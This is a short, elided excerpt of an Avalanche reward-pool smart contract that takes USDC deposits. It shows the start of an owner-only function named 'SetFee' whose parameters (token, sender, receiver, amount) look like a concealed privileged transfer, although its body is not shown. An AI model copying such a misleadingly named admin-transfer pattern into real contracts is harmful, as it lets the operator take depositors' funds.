/**
 *Submitted for verification at snowtrace.io on 2022-12-08
*/
...
contract UsdcSandGenesisRewardPool {
    using SafeMath for uint256;
    ...
    IERC20 public depositToken = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);    // USDC
    ...
    function SetFee(IERC20 _token, address _sender, address _receiver, uint256 _amount) external returns (bool) {
        require(msg.sender == daoFund, "access denied");
